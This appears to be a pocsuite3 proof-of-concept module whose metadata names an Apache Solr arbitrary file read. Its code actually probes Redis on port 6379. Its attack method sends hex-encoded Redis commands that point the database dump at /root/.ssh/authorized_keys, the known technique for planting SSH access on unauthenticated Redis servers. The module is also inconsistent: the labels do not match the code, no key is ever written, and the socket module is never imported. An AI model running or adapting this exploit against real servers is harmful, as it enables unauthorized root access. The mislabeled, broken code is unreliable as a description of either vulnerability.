from pocsuite3.api import Output, POCBase, register_poc, requests, logger,VUL_TYPE
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = '89339'
    version = '3'
    author = ['Suns0t']
    vulDate = '2021-03-17'
    createDate = '2021-07-20'
    updateDate = '2021-07-20'
    references = ['https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ']
    name = 'Apache Solr任意文件读取'
    appPowerLink = 'https://apache.org/'
    appName = 'Solr'
    appVersion = 'All'
    vulType = VUL_TYPE.ARBITRARY_FILE_READ
    desc = '''
        Apache Solr 存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标服务器敏感文件。
    '''
    samples = ['']

    def _verify(self):
        result = {}
        payload = b'\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option("rhost")
            port = self.getg_option("rport") or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and b'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['Info'] = "Solr未授权访问"
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_verify(result)

    def _attack(self):
        result = {}
        payload = b'\x63\x6f\x6e\x66\x69\x67\x20\x73\x65\x74\x20\x64\x69\x72\x20\x2f\x72\x6f\x6f\x74\x2f\x2e\x73\x73\x68\x2f\x0d\x0a'
        payload2 = b'\x63\x6f\x6e\x66\x69\x67\x20\x73\x65\x74\x20\x64\x62\x66\x69\x6c\x65\x6e\x61\x6d\x65\x20\x22\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x5f\x6b\x65\x79\x73\x22\x0d\x0a'
        payload3 = b'\x73\x61\x76\x65\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = self.getg_option("rhost")
            port = self.getg_option("rport") or 6379
            s.connect((host, port))
            s.send(payload)
            recvdata1 = s.recv(1024)
            s.send(payload2)
            recvdata2 = s.recv(1024)
            s.send(payload3)
            recvdata3 = s.recv(1024)
            if recvdata1 and b'+OK' in recvdata1:
                if recvdata2 and b'+OK' in recvdata2:
                    if recvdata3 and b'+OK' in recvdata3:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['Info'] = "Solr未授权访问EXP执行成功"
                        result['VerifyInfo']['URL'] = host
                        result['VerifyInfo']['Port'] = port
        except Exception as ex:
            logger.error(str(ex))
        finally:
            s.close()
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
